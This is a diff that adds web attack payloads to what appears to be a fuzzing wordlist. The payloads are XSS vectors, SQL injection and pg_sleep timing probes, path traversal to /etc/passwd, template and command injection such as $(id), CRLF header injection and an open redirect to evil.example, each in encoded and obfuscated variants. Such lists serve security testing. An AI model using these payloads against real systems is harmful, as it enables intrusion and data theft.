@@ -78,3 +78,165 @@ HTTPS%3A%2F%2FEXAMPLE.COM
 <iframe src%3Djavascript:alert(1)>
 <details open ontoggle%3Dalert(1)>
 <input autofocus onfocus%3Dalert(1)>
+<svg><script>alert(1)</script></svg>
+%3Csvg%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E
+%253Csvg%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%253C%252Fsvg%253E
+<SVG><SCRIPT>ALERT(1)</SCRIPT></SVG>
+<svg><script>alert(1)</script></svg>?aurose=1
+<svg><script>alert(1)</script></svg>&aurose=1
+<img src=x onerror=confirm(1)>
+%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+%253Cimg%2520src%253Dx%2520onerror%253Dconfirm%25281%2529%253E
+<img/**/src=x/**/onerror=confirm(1)>
+<img src%3dx onerror%3dconfirm(1)>
+<IMG SRC=X ONERROR=CONFIRM(1)>
+<img src=x onerror=confirm(1)>?aurose=1
+<img src=x onerror=confirm(1)>&aurose=1
+<a href=javascript:alert(1)>x</a>
+%3Ca%20href%3Djavascript%3Aalert%281%29%3Ex%3C%2Fa%3E
+%253Ca%2520href%253Djavascript%253Aalert%25281%2529%253Ex%253C%252Fa%253E
+<a/**/href=javascript:alert(1)>x</a>
+<a href%3djavascript:alert(1)>x</a>
+<A HREF=JAVASCRIPT:ALERT(1)>X</A>
+<a href=javascript:alert(1)>x</a>?aurose=1
+<a href=javascript:alert(1)>x</a>&aurose=1
+<iframe srcdoc='<script>alert(1)</script>'></iframe>
+%3Ciframe%20srcdoc%3D%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%3E%3C%2Fiframe%3E
+%253Ciframe%2520srcdoc%253D%2527%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%2527%253E%253C%252Fiframe%253E
+<iframe/**/srcdoc='<script>alert(1)</script>'></iframe>
+<iframe srcdoc%3d'<script>alert(1)</script>'></iframe>
+<IFRAME SRCDOC='<SCRIPT>ALERT(1)</SCRIPT>'></IFRAME>
+<iframe srcdoc='<script>alert(1)</script>'></iframe>?aurose=1
+<iframe srcdoc='<script>alert(1)</script>'></iframe>&aurose=1
+</title><script>alert(1)</script>
+%3C%2Ftitle%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%253C%252Ftitle%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
+</TITLE><SCRIPT>ALERT(1)</SCRIPT>
+</title><script>alert(1)</script>?aurose=1
+</title><script>alert(1)</script>&aurose=1
+<details open ontoggle=alert(1)>x</details>
+%3Cdetails%20open%20ontoggle%3Dalert%281%29%3Ex%3C%2Fdetails%3E
+%253Cdetails%2520open%2520ontoggle%253Dalert%25281%2529%253Ex%253C%252Fdetails%253E
+<details/**/open/**/ontoggle=alert(1)>x</details>
+<details open ontoggle%3dalert(1)>x</details>
+<DETAILS OPEN ONTOGGLE=ALERT(1)>X</DETAILS>
+<details open ontoggle=alert(1)>x</details>?aurose=1
+<details open ontoggle=alert(1)>x</details>&aurose=1
+<video><source onerror=alert(1)>
+%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E
+%253Cvideo%253E%253Csource%2520onerror%253Dalert%25281%2529%253E
+<video><source/**/onerror=alert(1)>
+<video><source onerror%3dalert(1)>
+<VIDEO><SOURCE ONERROR=ALERT(1)>
+<video><source onerror=alert(1)>?aurose=1
+<video><source onerror=alert(1)>&aurose=1
+<math><mi xlink:href='javascript:alert(1)'>X</mi></math>
+%3Cmath%3E%3Cmi%20xlink%3Ahref%3D%27javascript%3Aalert%281%29%27%3EX%3C%2Fmi%3E%3C%2Fmath%3E
+%253Cmath%253E%253Cmi%2520xlink%253Ahref%253D%2527javascript%253Aalert%25281%2529%2527%253EX%253C%252Fmi%253E%253C%252Fmath%253E
+<math><mi/**/xlink:href='javascript:alert(1)'>X</mi></math>
+<math><mi xlink:href%3d'javascript:alert(1)'>X</mi></math>
+<MATH><MI XLINK:HREF='JAVASCRIPT:ALERT(1)'>X</MI></MATH>
+<math><mi xlink:href='javascript:alert(1)'>X</mi></math>?aurose=1
+<math><mi xlink:href='javascript:alert(1)'>X</mi></math>&aurose=1
+<object data='javascript:alert(1)'></object>
+%3Cobject%20data%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fobject%3E
+%253Cobject%2520data%253D%2527javascript%253Aalert%25281%2529%2527%253E%253C%252Fobject%253E
+<object/**/data='javascript:alert(1)'></object>
+<object data%3d'javascript:alert(1)'></object>
+<OBJECT DATA='JAVASCRIPT:ALERT(1)'></OBJECT>
+<object data='javascript:alert(1)'></object>?aurose=1
+<object data='javascript:alert(1)'></object>&aurose=1
+<body onpageshow=alert(1)>
+%3Cbody%20onpageshow%3Dalert%281%29%3E
+%253Cbody%2520onpageshow%253Dalert%25281%2529%253E
+<body/**/onpageshow=alert(1)>
+<body onpageshow%3dalert(1)>
+<BODY ONPAGESHOW=ALERT(1)>
+<body onpageshow=alert(1)>?aurose=1
+<body onpageshow=alert(1)>&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+<svg><script>alert(1)</script></svg>::var0
+%3Csvg%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E::v0
+/xss/probe/0
+<img src=x onerror=confirm(1)>::var1
+%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E::v1
+/xss/probe/1
+<a href=javascript:alert(1)>x</a>::var2
+%3Ca%20href%3Djavascript%3Aalert%281%29%3Ex%3C%2Fa%3E::v2
+/xss/probe/2
